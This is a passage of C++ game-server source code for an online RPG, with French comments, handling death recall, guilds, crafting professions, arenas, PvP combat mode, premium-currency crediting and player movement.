   //si on force a restaurer toujours a la death recakll on restore kla ou ye mort...
   if(theApp.dwForceDethRecall)
   {
      wlTeleportPos = GetWL();
      bGemDestinySave = FALSE;
   }




   //NMNMNM
   //cast le spell pour baisser les competences...

   BYTE chStatus = 0x00;  //on est vivant
   TFCPacket sending;
   sending << (RQ_SIZE)RQ_NM_DeathStatus;
   sending << ( char ) chStatus;
   SendPlayerMessage( sending );

   SetHP(GetMaxHP(), true);

   // Teleport user to its death location.
   Unlock();

   Lock();
   UINT uiAppearance = ViewFlag(__FLAG_NMS_PLAYER_DEATH_SEX);
   SetAppearance( uiAppearance ); 
   Broadcast::BCObjectChanged( GetWL(), _DEFAULT_RANGE_CHANGE,uiAppearance,GetID(),0);
   Unlock();

   Lock();
   Teleport( wlTeleportPos, 0 );

   if(bGemDestinySave)
      TELL_PLAYER( 15015 );
   Unlock();

   // Set the unit's under block to SAFE_HAVEN to avoid that a PC already at the death pos, casting a normal block,
   // kills the player.
   SetUnderBlock( __INDOOR_SAFE_HAVEN );
}

void Character::NMGetGuildList(BYTE chShow)
{
   if(theApp.dwGuildSystemEnable == 0 || (theApp.dwGuildSystemEnable == 2 && !GetPlayer()->IsGod()))
   {
      SendInfoMessage( _STR( 15113 , GetLang() ),0x0020FF);
      return;
   }


   if(GetGuildName() == "")
   {
      char buf[ 1024 ];
      sprintf_s( buf,1024, _STR( 15048 , GetLang() ));
      SendInfoMessage( buf,0x0080FF);
      return;
   }

   //theApp.AddGuildRequest(this,NULL,NULL,GUILD_REQ_GET_USER_LIST,chShow,0,0,"","");
   theApp.AddGuildRequest(NULL,NULL,NULL,GUILD_REQ_GET_USER_LIST,this->GetID(),chShow,0,0,"","");
   return;
}

void Character::NMGetProfession()
{
   if(theApp.dwProfessionSystemEnable == 0 || (theApp.dwProfessionSystemEnable == 2 && !GetPlayer()->IsGod()))
   {
      SendInfoMessage( _STR( 15152 , GetLang() ),0x0020FF);
      return;
   }

   TemplateList< USER_PROFESSION_F > *lpProf = GetProfession();
   USHORT ushID;
   long lNbrProfession = 6;
   TFCPacket sending;
   sending << (RQ_SIZE)RQ_NM_GetProfession;
   sending << (long)lNbrProfession;
   sending << (long)lpProf->NbObjects();

   sending << (short)ViewFlag(__FLAG_PROF_APOTICAIRE);
   sending << (short)ViewFlag(__FLAG_PROF_BIJOUTIER);
   sending << (short)ViewFlag(__FLAG_PROF_COUTURIER);
   sending << (short)ViewFlag(__FLAG_PROF_ARMURIER);
   sending << (short)ViewFlag(__FLAG_PROF_FORGERON);
   sending << (short)ViewFlag(__FLAG_PROF_EBENISTE);



   lpProf->Lock();

   lpProf->ToHead();
   while( lpProf->QueryNext() )
   {
      ushID = lpProf->Object()->ushID;
      sFormule *pFormule = Professions::GetFormules(ushID);
      if(pFormule)
      {
         sending << (char)pFormule->chProfession;
         sending << (short)pFormule->ushID;
         sending << (short)pFormule->ushSkillLevel;
         sending << (short)Professions::GetFormuleSkin(ushID);
         sending << Professions::GetFormuleName(ushID);
         sending << (long)pFormule->ushNbrRequestID;
         for(int i=0;i<pFormule->ushNbrRequestID;i++)
         {
            //recup le nom du premier ID
            sending << Professions::GetFormuleNameReqByID(pFormule->pRequestItemList[i].ushRequestID);
            sending << (long)pFormule->pRequestItemList[i].ushQty;
            sending << (long)BackCount(pFormule->pRequestItemList[i].ushRequestID);
         }
      }
      else
      {
         char chT  = 0;
         short shT = 0;
         CString strT = " ";
         long lT = 0;

         sending << (char)chT;
         sending << (short)shT;
         sending << (short)shT;
         sending << (short)shT;
         sending << strT;
         sending << (long)lT;
      }
   }
   lpProf->Unlock();   

   SendPlayerMessage(sending);

}

void Character::NMMakeFormule(USHORT ushID)
{
   Players *pl = static_cast< Players * >( GetPlayer() );
   if(theApp.dwProfessionSystemEnable == 0 || (theApp.dwProfessionSystemEnable == 2 && !pl->IsGod()))   
   {
      SendInfoMessage( _STR( 15152 , GetLang() ),0x0020FF);
      return;
   }

   //1: Verifie que la formule existe...
   sFormule *pFormule = Professions::GetFormules(ushID);
   if(!pFormule)
   {
      //la formule existe pas...
      SendInfoMessage( _STR( 15020, GetLang() ),0x0000CC );
      _LOG_DEBUG
         LOG_DEBUG_LVL1,
         "---===HACK PROFESSION ==-- Unknown this Formule ID.... ID[%d]   Name:%s    Account:%s",
         ushID,
         this->GetTrueName(),
         this->GetPlayer()->GetFullAccountName()
         LOG_
         return;
   }


   //2: verifie que le use a deja appris cette formule
   //   en meme temps si il possede tous les ingrediants...
   bool bFormuleExist    = false;
   bool bFormuleHaveItem = true;
   TemplateList< USER_PROFESSION_F > *lpProf = GetProfession();
   lpProf->Lock();
   lpProf->ToHead();
   while( lpProf->QueryNext() && bFormuleExist==false)
   {
      if(lpProf->Object()->ushID == ushID)
      {
         sFormule *pFormule = Professions::GetFormules(ushID);
         if(pFormule)
         {
            bFormuleExist = true;

            for(int i=0;i<pFormule->ushNbrRequestID;i++)
            {
               if(BackCount(pFormule->pRequestItemList[i].ushRequestID) < pFormule->pRequestItemList[i].ushQty)
                  bFormuleHaveItem = false;
            }
         }
      }
   }
   lpProf->Unlock();


   if(!bFormuleExist)
   {
      //le use a pas cette formule la...
      SendInfoMessage( _STR( 15021, GetLang() ),0x0000CC );
      _LOG_PROFESSION
         LOG_DEBUG_LVL1,
         "---===HACK PROFESSION ==-- Use never learn this Formule ID.... ID[%d]   Name:%s    Account:%s",
         ushID,
         this->GetTrueName(),
         this->GetPlayer()->GetFullAccountName()
         LOG_
         return;
   }

   if(!bFormuleHaveItem)
   {
      //le use a pas cette formule la...
      SendInfoMessage( _STR( 15022, GetLang() ),0x0000CC );
      _LOG_PROFESSION
         LOG_DEBUG_LVL1,
         "---===HACK PROFESSION ==-- Use Not have all formule requested items Formule ID.... ID[%d]   Name:%s    Account:%s",
         ushID,
         this->GetTrueName(),
         this->GetPlayer()->GetFullAccountName()
         LOG_
         return;
   }

   //oki, rendu ici, on c que la formule existe,
   //                on c que le use a deja appris cette formule
   //                on c qu<il possede tout pour faire cette formule...
   //donc on fait la formule...

   bool bOK = false;
   lpProf->Lock();
   lpProf->ToHead();
   while( lpProf->QueryNext() && bOK==false)
   {
      if(lpProf->Object()->ushID == ushID)
      {

         //remove all needed items
         sFormule *pFormule = Professions::GetFormules(ushID);
         if(pFormule)
         {
            _LOG_PROFESSION
               LOG_DEBUG_LVL1,
               "Profession:  Remove items for Formule ID.... ID[%d]   Name:%s    Account:%s",
               ushID,
               this->GetTrueName(),
               this->GetPlayer()->GetFullAccountName()
               LOG_

               for(int i=0;i<pFormule->ushNbrRequestID;i++)
               {
                  //si l<item est unique on dois le jeter par quantite de 1 a chaque coup...
                  if(Professions::GetFormuleNameReqIDISUnique(pFormule->pRequestItemList[i].ushRequestID))
                  {
                     for(int n=0;n<pFormule->pRequestItemList[i].ushQty;n++)
                     {
                        BackRemove( pFormule->pRequestItemList[i].ushRequestID, 1);
                     }
                  }
                  else
                  {
                     BackRemove( pFormule->pRequestItemList[i].ushRequestID, pFormule->pRequestItemList[i].ushQty);
                  }
               }

               bool bCreate  = false;
               int iIncSkill = 0;

               //now regarde si la formule de creation marche...
               BoostFormula CreateBoust;
               CreateBoust.SetFormula(pFormule->pstrFormuleCreate);
               int iPCCreate = CreateBoust.GetBoost(this);
               int dwRollVal = rand()%100;

               /*
               {
               FILE *pf = fopen("C:\\!projets\\!MPP\\!Dev\\!! !!.txt","a+t");
               fprintf(pf,"%d   %d --> %s\n",iPCCreate,dwRollVal,pFormule->pstrFormuleCreate);
               fclose(pf);
               }
               */


               if(dwRollVal <= iPCCreate)
               {
                  bCreate = true;

                  //now si on incremente le skil....
                  BoostFormula CreateBoustComp;
                  CreateBoustComp.SetFormula(pFormule->pstrFormuleCompGagner);
                  iIncSkill = CreateBoustComp.GetBoost(this);
               }

               if(bCreate)
               {

                  //now create new items...
                  _LOG_PROFESSION
                     LOG_DEBUG_LVL1,
                     "Profession:  Summon items for Formule ID.... ID[%d] Qty = %d   Name:%s    Account:%s",
                     ushID,
                     pFormule->ushItemResultQty,
                     this->GetTrueName(),
                     this->GetPlayer()->GetFullAccountName()
                     LOG_

                     for(int k=0;k<pFormule->ushItemResultQty;k++)
                     {
                        Objects *lpItem = new Objects;
                        if( lpItem->Create( U_OBJECT, pFormule->ushItemResultID ) )
                        {
                           //_item *item = NULL;
                           //lpItem->SendUnitMessage( MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &item );

                           if(lpItem->IsUnique())
                              lpItem->SetCreatedBy(this->GetTrueName().GetBuffer(0));
                           AddToBackpack( lpItem );
                        }
                        else
                        {
                           lpItem->DeleteUnit();
                        }


                     }

                     char buf[ 1024 ];
                     sprintf_s( buf,1024, _STR( 15023 , GetLang() ),pFormule->ushItemResultQty,Professions::GetFormuleName(pFormule->ushID));
                     SendInfoMessage( buf,0x0080FF);

                     if(iIncSkill >0)
                     {
                        char buf[ 1024 ];
                        switch(pFormule->chProfession)
                        {
                        case 0: 
                           sprintf_s( buf,1024, _STR( 15025 , GetLang() ),_STR( 15026, GetLang() )  ,iIncSkill);
                           SetFlag(__FLAG_PROF_APOTICAIRE,ViewFlag(__FLAG_PROF_APOTICAIRE)+iIncSkill);
                           break;
                        case 1:
                           sprintf_s( buf,1024, _STR( 15025 , GetLang() ),_STR( 15027, GetLang() )  ,iIncSkill);
                           SetFlag(__FLAG_PROF_BIJOUTIER,ViewFlag(__FLAG_PROF_BIJOUTIER)+iIncSkill);
                           break;
                        case 2:
                           sprintf_s( buf,1024, _STR( 15025 , GetLang() ),_STR( 15028, GetLang() )  ,iIncSkill);
                           SetFlag(__FLAG_PROF_COUTURIER,ViewFlag(__FLAG_PROF_COUTURIER)+iIncSkill);
                           break;
                        case 3:
                           sprintf_s( buf,1024, _STR( 15025 , GetLang() ),_STR( 15029, GetLang() )  ,iIncSkill);
                           SetFlag(__FLAG_PROF_ARMURIER,ViewFlag(__FLAG_PROF_ARMURIER)+iIncSkill);
                           break;
                        case 4:
                           sprintf_s( buf,1024, _STR( 15025 , GetLang() ),_STR( 15030, GetLang() )  ,iIncSkill);
                           SetFlag(__FLAG_PROF_FORGERON,ViewFlag(__FLAG_PROF_FORGERON)+iIncSkill);
                           break;
                        case 5:
                           sprintf_s( buf,1024, _STR( 15025 , GetLang() ),_STR( 15031, GetLang() )  ,iIncSkill);
                           SetFlag(__FLAG_PROF_EBENISTE,ViewFlag(__FLAG_PROF_EBENISTE)+iIncSkill);
                           break;
                        }
                        SendInfoMessage( buf,0x0080FF);

                        //Incremente flag...

                     }
               }
               else
               {
                  SendInfoMessage( _STR( 15024, GetLang() ),0x0080FF );

                  _LOG_PROFESSION
                     LOG_DEBUG_LVL1,
                     "Profession:  Create item boust fail....... ID[%d] Qty = %d   Name:%s    Account:%s",
                     ushID,
                     pFormule->ushItemResultQty,
                     this->GetTrueName(),
                     this->GetPlayer()->GetFullAccountName()
                     LOG_
               }
               bOK = true;

         }
         else
         {
            SendInfoMessage( _STR( 15021, GetLang() ),0x0000CC );
            _LOG_PROFESSION
               LOG_DEBUG_LVL1,
               "---===HACK PROFESSION ==-- Use never learn this Formule ID.... ID[%d]   Name:%s    Account:%s",
               ushID,
               this->GetTrueName(),
               this->GetPlayer()->GetFullAccountName()
               LOG_
         }
      }
   }
   lpProf->Unlock();

   if(bOK)
   {

      TemplateList< USER_PROFESSION_F > *lpProf = GetProfession();
      USHORT ushID;
      long lNbrProfession = 6;
      TFCPacket sending;
      sending << (RQ_SIZE)RQ_NM_SendMakeFormule;
      sending << (long)lNbrProfession;
      sending << (long)lpProf->NbObjects();

      sending << (short)ViewFlag(__FLAG_PROF_APOTICAIRE);
      sending << (short)ViewFlag(__FLAG_PROF_BIJOUTIER);
      sending << (short)ViewFlag(__FLAG_PROF_COUTURIER);
      sending << (short)ViewFlag(__FLAG_PROF_ARMURIER);
      sending << (short)ViewFlag(__FLAG_PROF_FORGERON);
      sending << (short)ViewFlag(__FLAG_PROF_EBENISTE);



      lpProf->Lock();

      lpProf->ToHead();
      while( lpProf->QueryNext() )
      {
         ushID = lpProf->Object()->ushID;
         sFormule *pFormule = Professions::GetFormules(ushID);
         if(pFormule)
         {
            sending << (char)pFormule->chProfession;
            sending << (short)pFormule->ushID;
            sending << (short)pFormule->ushSkillLevel;
            sending << (short)Professions::GetFormuleSkin(ushID);
            sending << Professions::GetFormuleName(ushID);
            sending << (long)pFormule->ushNbrRequestID;
            for(int i=0;i<pFormule->ushNbrRequestID;i++)
            {
               //recup le nom du premier ID
               sending << Professions::GetFormuleNameReqByID(pFormule->pRequestItemList[i].ushRequestID);
               sending << (long)pFormule->pRequestItemList[i].ushQty;
               sending << (long)BackCount(pFormule->pRequestItemList[i].ushRequestID);
            }
         }
      }
      lpProf->Unlock();   

      SendPlayerMessage(sending);
   }
}

void Character::NMModeRPPhaseID(int iRPPhase)
{
   m_iRPPhase = iRPPhase;
   if(m_iRPPhase >=0)
   {
      m_iRPTalkCnt    = 0;
      m_iRPNOTTalkCnt = 0;
   }
}

int Character::GetNMModeRPPhaseID()
{
   return m_iRPPhase;
}

int Character::GetNMModeRPPhaseCntTalk()
{
   return m_iRPTalkCnt;
}

int Character::GetNMModeRPPhaseCntNOTTalk()
{
   return m_iRPNOTTalkCnt;
}

void Character::SetArenaID(int iID)
{
   m_iArenaID = iID;
}

int Character::GetArenaID()
{
   return m_iArenaID;
}

void  Character::SetArenaType(int iType)
{
   m_iArenaType = iType;
}
int   Character::GetArenaType()
{
   return m_iArenaType;
}

void Character::SetArenaKill(int iVal)
{
   m_iArenaKill = iVal;
}
int  Character::GetArenaKill()
{
   return m_iArenaKill;
}
void Character::SetArenaDead(int iVal)
{
   m_iArenaDead = iVal;
}
int  Character::GetArenaDead()
{
   return m_iArenaDead;
}
void Character::SetArenaFlag(int iVal)
{
   m_iArenaFlag = iVal;
}
int  Character::GetArenaFlag()
{
   return m_iArenaFlag;
}
void Character::SetArenaTeam(int iVal)
{
   m_iArenaTeam = iVal;
}
int  Character::GetArenaTeam()
{
   return m_iArenaTeam;
}

void Character::SetArenaLastStart(DWORD dwVal)
{
   m_dwArenaLastStart = dwVal;
}

DWORD Character::GetArenaLastStart()
{
   return m_dwArenaLastStart;
}

void   Character::AddArenaPVP(double dVal)
{
   m_dArenaPVP += dVal;
   if(m_dArenaPVP < 0.00)
      m_dArenaPVP = 0.00;
}

void  Character::SetArenaPVP(double dVal)
{
   m_dArenaPVP = dVal;
}
double Character::GetArenaPVP()
{
   return m_dArenaPVP;
}
void  Character::AddArenaINACTIF()
{
   if(timeGetTime() - m_iArenaINACTIFTime > 60000)
   {
      m_iArenaINACTIFTime = timeGetTime();
      m_iArenaINACTIFMin++;
   }
}
void  Character::ResetArenaINACTIF()
{
   m_iArenaINACTIFTime = timeGetTime();
}
void  Character::ResetArenaINACTIFStart()
{
   m_iArenaINACTIFTime = timeGetTime();
   m_iArenaINACTIFMin  = 0;
}

int  Character::GetArenaINACTIF()
{
   return m_iArenaINACTIFMin;
}



void  Character::AddArenaDUREE()
{
   if(timeGetTime() - m_iArenaDUREETime > 60000)
   {
      m_iArenaDUREETime = timeGetTime() ;
      m_iArenaDUREEMin++;
   }
}
void  Character::ResetArenaDUREE()
{
   m_iArenaDUREETime = timeGetTime();
   m_iArenaDUREEMin  = 0;
}

int  Character::GetArenaDUREE()
{
   return m_iArenaDUREEMin+1;
}

void  Character::AddArenaPOINTS(int dwVal,CString strReason)
{
    m_iArenaPOINTS += dwVal;

    _LOG_ARENA
       LOG_ALWAYS,
       "ARENE%d ID %d: Player ID:%d %s (%s) ADD POINTS = %d reason %s",
       GetArenaID(),
       GetArenaType(),
       GetID(),
       GetTrueName(),
       GetPlayer()->GetFullAccountName(),dwVal,strReason
       LOG_

    CString strLog;
    strLog.Format("ARENE%d ID %d: Player ID:%d %s (%s) ADD POINTS = %d reason %s",GetArenaID(),
                  GetArenaType(),GetID(),GetTrueName(),GetPlayer()->GetFullAccountName(),dwVal,strReason);

    //CPlayerManager::SendMessagetoAllGOD(strLog);
}
void  Character::SetArenaPOINTS(int dwVal)
{
   m_iArenaPOINTS = dwVal;
}

int Character::GetArenaPOINTS()
{
   return m_iArenaPOINTS;
}

void  Character::ResetArenaPOINTS(CString strReason)
{
   m_iArenaPOINTS = 0;

   _LOG_ARENA
      LOG_ALWAYS,
      "ARENE%d ID %d: Player ID:%d %s (%s) RESET POINTS reason %s",
      GetArenaID(),
      GetArenaType(),
      GetID(),
      GetTrueName(),
      GetPlayer()->GetFullAccountName(),strReason
      LOG_

   CString strLog;
   strLog.Format("ARENE%d ID %d: Player ID:%d %s (%s) RESET POINTS reason %s",GetArenaID(),
                  GetArenaType(),GetID(),GetTrueName(),GetPlayer()->GetFullAccountName(),strReason);
   //CPlayerManager::SendMessagetoAllGOD(strLog);
}



void Character::NMCombatMode(int iAttackMode,bool bSilent)
{
   int iCurTime = time(NULL);

   int iAsk = iAttackMode;
   int iSet = 0;
   if(theApp.m_dwPVPSyetem2Actif == 1) //Entre en mode combat...
   {
      if(iAttackMode > 0 )
      {
         m_chCombatMode = 1;
         SetFlag(__FLAG_MODE_COMBAT_TIMES,iCurTime);

         int iSpellID = 30405;
         if(GetCrime() == 0 && GetHonor() == 0)
            iSpellID = 30405;
         else if(GetCrime() >= GetHonor())
            iSpellID = 30319;
         else
            iSpellID = 30320;

         if(!bSilent)
         {
            Broadcast::BCSpellEffect( GetWL(), _DEFAULT_RANGE, iSpellID, GetID(), 0, GetWL(),GetWL(),GetNextGlobalEffectID(),0);
            SendSystemMessage(_STR( 15045, GetLang() ));
         }
         

         iAsk = iAttackMode;
         iSet = 1;
      }
      else
      {
         //Valide quil peu etre desactiver...
         if(iCurTime-ViewFlag( __FLAG_MODE_COMBAT_TIMES ) > 20)
         {

            //Desactive le mode combat PVP
            m_chCombatMode = 0;
            SendSystemMessage(_STR( 15046, GetLang() ));
            iAsk = iAttackMode;
            iSet = 1;
         }
         else
         {
            SendSystemMessage(_STR( 15043, GetLang() ));
            iAsk = iAttackMode;
            iSet = 0;
         }
      }
   }
   else
   {
      if(iAttackMode > 0 )
      {
         m_chCombatMode = 1;
         SetFlag(__FLAG_MODE_COMBAT_TIMES,iCurTime);

         iAsk = iAttackMode;
         iSet = 1;
      }
      else
      {
         //Desactive le mode combat PVP
         m_chCombatMode = 0;
         iAsk = iAttackMode;
         iSet = 1;
      }
   }

   TFCPacket sendingCB;
   sendingCB << (RQ_SIZE)RQ_AttackMode;
   sendingCB << (long)iAttackMode;
   sendingCB << (long)iSet;
   SendPlayerMessage(sendingCB);

   TFCPacket sending;
   sending << (RQ_SIZE)RQ_UnitUpdate;
   PacketUnitInformation( sending );
   Broadcast::BCast( GetWL(), _DEFAULT_RANGE, sending );
}

char Character::GetNMCombatMode()
{
   if(m_chCombatMode == 1)
   {
      if(theApp.m_dwPVPSyetem2Actif == 1) //gestion des couleur pour pvp system 2
      {
         //1 == HRP == rouge
         //2 == RP  == bleue
         //3 == neutre 
         if(GetCrime() == 0 && GetHonor() == 0)
            return 3; //neutre vert
         else if(GetCrime() >= GetHonor())
            return 1; //rouge
         else
            return 2; //bleue
      }
      else
      {
         if(ViewFlag( __FLAG_RPHRP_STATUS ) == 0)
            return 1; //1 == HRP == rouge
         else
            return 2; //2 == RP  == bleue
      }
   }
   else
      return m_chCombatMode; //0
}

void  Character::SetGuildName(char *pstrName)
{
   m_strGuildName.Format("%s",pstrName);
}

void  Character::SetGuildNameInvited(char *pstrName,Character *lpCharacter)
{
   m_strGuildNameInvited.Format("%s",pstrName);
   m_pInvitedByChar = lpCharacter;
}

void  Character::SetGuildTitle(DWORD dwTitle)
{
   m_dwGuildTitle = dwTitle;
}

void  Character::SetGuildPermission(DWORD dwPermission)
{
   m_dwGuildPermission = dwPermission;
}

void  Character::SetGuildPermissionTmp(DWORD dwPermission)
{
   m_dwGuildPermissionTmp = dwPermission;
}

void  Character::ValidNMSGold()
{
   Players *pl = (Players *)ThisPlayer;

   ODBCNMSGold.Lock();

   CStringArray aTRCompleted;
   CString csQuery;
   csQuery.Format( "SELECT nmsAccount, nbrEcu, numTransaction FROM NMSGold WHERE nmsAccount = '%s' AND status =0",pl->GetFullAccountName());
   ODBCNMSGold.SendRequest( (LPCTSTR)csQuery );

   bool bNeedSaveAccount = FALSE;
   int iCnt  = 0;
   while( ODBCNMSGold.Fetch())
   {
    
      char  lpszAccount [ 50 ];
      char  lpszNumTr   [ 50 ];
      DWORD dwNbrEcu = 0;

      ODBCNMSGold.GetString( 1, lpszAccount, 50 );
      ODBCNMSGold.GetDWORD ( 2,&dwNbrEcu);
      ODBCNMSGold.GetString( 3, lpszNumTr, 50 );

      RegKeyHandler regKey;
      regKey.Open( HKEY_LOCAL_MACHINE, theApp.csT4CKEY+NMSGOLD_KEY );
      int PromotionPourcent = regKey.GetProfileInt( "Promo_Pourcent", 0 );
      bool bPromo = false;
      int iNbrGoldPromo = 0;
      if(PromotionPourcent > 0 && PromotionPourcent < 100)
      {
         iNbrGoldPromo = dwNbrEcu*PromotionPourcent/100;
         if(iNbrGoldPromo > 0)
            bPromo = true;

      }

      //On doit ajouter les ecu...
      int iNbrAvait     = pl->GetNMSGold();
      int iNewTotal     = dwNbrEcu+iNbrGoldPromo+iNbrAvait;

      pl->SetNMSGold(iNewTotal);
      pl->SaveAccount();

      TFormat format;
      if(bPromo)
         SendSystemMessage( format(_STR(15382, GetLang()),  lpszNumTr,dwNbrEcu,iNbrGoldPromo,iNewTotal), CL_YELLOW );
      else
         SendSystemMessage( format(_STR(15342, GetLang()),  lpszNumTr,dwNbrEcu,iNewTotal), CL_YELLOW );
      
      _LOG_ACHAT_NMS
         LOG_ALWAYS,
         "NMSGOLD %s's (%s) Add %d NMSGold. Now Player have a total of %d NMS Gold PaypalTR = %s",
         (LPCTSTR)GetTrueName(),
         (LPCTSTR)pl->GetFullAccountName(),
         dwNbrEcu,
         iNewTotal,
         lpszNumTr
         LOG_

      //ste le flag a PAYER sur cet achat...
      CString strNewTR;
      strNewTR.Format("%s",lpszNumTr);
      aTRCompleted.Add(strNewTR);
   }
   ODBCNMSGold.Cancel();

   //mark ses paiement comem payer...
   for(int itr=0;itr<aTRCompleted.GetCount();itr++)
   {
      csQuery.Format( "UPDATE NMSGold SET status=1 WHERE numTransaction='%s'",aTRCompleted[itr].GetBuffer(0));
      if(ODBCNMSGold.SendRequest( (LPCTSTR)csQuery ))
      {
         ODBCNMSGold.Commit();
         ODBCNMSGold.Cancel();
      }
      else
         ODBCNMSGold.Cancel();
   }
   ODBCNMSGold.Unlock();
   aTRCompleted.RemoveAll();
}


void  Character::LoadEquipedFromID(int *piEquiped, DWORD dwID)
{
	CString csQuery;
	ODBCCharReadCon.Lock();

	// Load user items.
	{				
		const int DB_ObjID    =		 1;				
		const int DB_EquipPos =		 2;
		const int DB_ObjType  =		 3;
		const int DB_Qty      =     4;
		const int DB_MadeBy   =     5;

		//Unit *lpuItem;
		LOADED_ITEM *lpLoadedItem;

		// Temporary list which will contain the loaded items.				
		TemplateList < LOADED_ITEM > tlLoadedItems;

    	csQuery.Format( "SELECT ObjID, EquipPos, ObjType, Qty, MadeBy FROM PlayerItems WHERE OwnerID=%u AND EquipPos > 0", dwID );

		if( ODBCCharReadCon.SendRequest( (LPCTSTR)csQuery ) )
		{
			// Scroll through all fetched records.
			while( ODBCCharReadCon.Fetch() )
			{						
				lpLoadedItem = new LOADED_ITEM;

				ODBCCharReadCon.GetDWORD ( DB_ObjID,    &lpLoadedItem->dwObjID );
				ODBCCharReadCon.GetBYTE  ( DB_EquipPos, &lpLoadedItem->bEquipPos );
				ODBCCharReadCon.GetString( DB_ObjType,  (LPTSTR)lpLoadedItem->lpszObjType, 50 );
				ODBCCharReadCon.GetDWORD ( DB_Qty,      &lpLoadedItem->dwQty );
				if( lpLoadedItem->dwQty == 0 )
				{
					lpLoadedItem->dwQty = 1;
				}
				memset(lpLoadedItem->lpszMadeBy     ,0x00,50);
				ODBCCharReadCon.GetString( DB_MadeBy,  (LPTSTR)lpLoadedItem->lpszMadeBy, 50 );

				// Add them to the loaded items list.
				tlLoadedItems.AddToTail( lpLoadedItem );
			}

			// Cancel the previous fetch operation
			ODBCCharReadCon.Cancel();

			int w;
			for( w = 0; w < EQUIP_POSITIONS; w++ )
			{
				piEquiped[ w ] = -1;                        
			}


			
			// Scroll through the loaded items
			tlLoadedItems.ToHead();
			while( tlLoadedItems.QueryNext() )
			{
				lpLoadedItem = tlLoadedItems.Object();

				Objects *lpuItem = new Objects();

				// If object could be created
				if( lpuItem->Create( U_OBJECT, Unit::GetIDFromName( lpLoadedItem->lpszObjType, U_OBJECT, TRUE ) ) )
				{
					// If item is in the backpack;
					if( lpLoadedItem->bEquipPos <= EQUIP_POSITIONS )
					{
						if( lpLoadedItem->bEquipPos - 1 == two_hands )
						{                                    
							if( piEquiped[ weapon_right ] != -1 )
								piEquiped[ weapon_right ] = -1;

							if( piEquiped[ weapon_left ] != piEquiped[ weapon_right ] && piEquiped[ weapon_left ] != NULL )
								piEquiped[ weapon_left ] = -1;

                     piEquiped[ weapon_right ] = piEquiped[ weapon_left ] = lpuItem->GetAppearance();
						}
						else
						{
							piEquiped[ lpLoadedItem->bEquipPos - 1 ] = lpuItem->GetAppearance();;
						}
					}
               lpuItem->DeleteUnit();
				}
				else
				{
					lpuItem->DeleteUnit();
				}
				tlLoadedItems.DeleteAbsolute();
			}
			
		}
		// Cancel previous fetch operation.
		ODBCCharReadCon.Cancel();
	}
	ODBCCharReadCon.Unlock();
}

void  Character::LoadHairColorFromID(USHORT &ushHairColor, DWORD dwID)
{
   ushHairColor = 0;
   CString csQuery;
   ODBCCharReadCon.Lock();
   {				
      const int DB_FlagValue =		1;				
      csQuery.Format( "SELECT FlagValue FROM Flags WHERE OwnerID=%u AND FlagID=%u", dwID ,__FLAG_NMS_COLOR_HAIR);
      if( ODBCCharReadCon.SendRequest( (LPCTSTR)csQuery ) )
      {
         // Scroll through all fetched records.
         while( ODBCCharReadCon.Fetch() )
         {						
            ODBCCharReadCon.GetWORD ( DB_FlagValue,    &ushHairColor );
         }
      }
      // Cancel previous fetch operation.
      ODBCCharReadCon.Cancel();
   }
   ODBCCharReadCon.Unlock();
}


void Character::StartMove(short shDirection)
{
   bool bBroadcastRT = true;
   const int MoveExhaust = 200 MILLISECONDS;

   TFCPacket sending;

   Players *pl = (Players *)ThisPlayer;

   if(theApp.dwAntiplugSystem == 1)
   {
      if(pl->dwExitDecompte > 1 && pl->dwExitDecompte!= 0xFFFF)
      {
         pl->dwExitDecompte = 0xFFFF;
      } 
	  if(pl->dwReloadDecompte > 1 && pl->dwReloadDecompte!= 0xFFFF)
	  {
		  pl->dwReloadDecompte = 0xFFFF;
	  } 
   }
   StopAutoCombat();
   if(GetArenaID() >0  && GetArenaTeam() >0)
   {
      if(GetArenaType() == ARENE1_TYPE)
      {
         Arena1Master::RemTakeList(GetPlayer(),GetArenaID()-1);
      }
      else if(GetArenaType() == ARENE2_TYPE)
      {
         Arena2Master::RemTakeList(0,GetPlayer(),GetArenaID()-1);
         Arena2Master::RemTakeList(1,GetPlayer(),GetArenaID()-1);
      }
   }

   char searchway;
   WorldPos tmp;
   WorldPos saved_pos = GetWL();

   EXHAUST newExhaust = GetExhaust();

   // If user isn't move exhaust
   // Or if user sends an advanced move exhaust.
   if( newExhaust.move <= TFCMAIN::GetRound() || ( newExhaust.boWalking && newExhaust.move - TFCMAIN::GetRound() <= MoveExhaust ))
   {
      // Was user exhausted?
      if( newExhaust.move <= TFCMAIN::GetRound() )
      {
         // Was that exhaustion at least lower then the normal walking exhaust?
         newExhaust.boWalking = TRUE;
      }
      else
      {
         // Otherwise no exhaust, continue to allow advanced packets.
         newExhaust.boWalking = FALSE;
      }

      switch( shDirection )
      {
         case RQ_MoveNorth:               // NORTH
            tmp = MoveUnit(DIR::north, false, true, bBroadcastRT );
            searchway = DIR::north;
         break;
         case RQ_MoveNorthEast:               // NORTHEAST
            tmp = MoveUnit(DIR::northeast, false, true, bBroadcastRT );
            searchway = DIR::northeast; 
         break;
         case RQ_MoveEast:                // EAST
            tmp = MoveUnit(DIR::east, false, true, bBroadcastRT );
            searchway = DIR::east;
         break;
         case RQ_MoveSouthEast:				   // SOUTHEAST
            tmp = MoveUnit(DIR::southeast, false, true, bBroadcastRT );
            searchway = DIR::southeast;
         break;
         case RQ_MoveSouth:                // SOUTH
            tmp = MoveUnit(DIR::south, false, true, bBroadcastRT );
            searchway = DIR::south;
         break;
         case RQ_MoveSouthWest:                // SOUTHWEST
            tmp = MoveUnit(DIR::southwest, false, true, bBroadcastRT );
            searchway = DIR::southwest;
         break;
         case RQ_MoveWest:		           // WEST
            tmp = MoveUnit(DIR::west, false, true, bBroadcastRT ); 
            searchway = DIR::west;
         break;
         case RQ_MoveNorthWest:                // NORTHWEST						
            tmp = MoveUnit(DIR::northwest, false, true, bBroadcastRT );
            searchway = DIR::northwest;
         break;
         case RQ_GetPlayerPos:
            tmp = GetWL();
            searchway = -1;
         break;
      }

      newExhaust.move = TFCMAIN::GetRound() + MoveExhaust;
      SetExhaust(newExhaust);

      WorldMap *world = TFCMAIN::GetWorld(tmp.world);

      // Then send the peripheric object to the person who moved					
      if( ( tmp.X != saved_pos.X || tmp.Y != saved_pos.Y || tmp.world != saved_pos.world ) && world != NULL )
      {				
         // If there are peripheral objects to packet.
         if( world->packet_peripheral_units(tmp, 0, (DIR::MOVE)searchway, sending, this ) )
         {
            SendPlayerMessage( sending );
         }
         
         Lock();
         if(m_pMinions)
         {
            m_pMinions->MoveUnit((DIR::MOVE)searchway,false,true,true);
            m_pMinions->SetLastMoveTime(TFCMAIN::GetRound());
         }
         Unlock();

